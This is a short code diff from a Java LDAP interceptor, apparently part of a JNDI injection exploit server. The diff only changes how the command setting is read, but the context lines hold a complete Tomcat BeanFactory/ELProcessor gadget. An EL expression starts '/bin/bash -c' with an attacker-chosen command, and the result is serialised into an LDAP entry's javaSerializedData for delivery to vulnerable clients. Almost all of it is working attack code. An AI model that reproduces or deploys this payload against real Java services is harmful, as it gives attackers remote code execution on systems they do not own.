@@ -25,14 +25,14 @@ public class TomcatInterceptor implements LDAPInterceptor {
         entry.addAttribute("javaClassName", "foo");
 
         String elTpl = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'] (['/bin/bash','-c','%s']).start()\")";
-        String payload = String.format(elTpl, Config.command);
+        String payload = String.format(elTpl, Config.getGlobalInstance().command);
         ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
         ref.add(new StringRefAddr("forceString", "bbbar=eval"));
         ref.add(new StringRefAddr("bbbar", payload));
 
         byte[] data = CommonUtil.serialize(ref);
         entry.addAttribute("javaSerializedData", data);
-        System.out.printf("[LDAP] send serialized data BeanFactory ref >> execute command [bash -c '%s']", Config.command);
+        System.out.printf("[LDAP] send serialized data BeanFactory ref >> execute command [bash -c '%s']", Config.getGlobalInstance().command);
 
         result.sendSearchEntry(entry);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
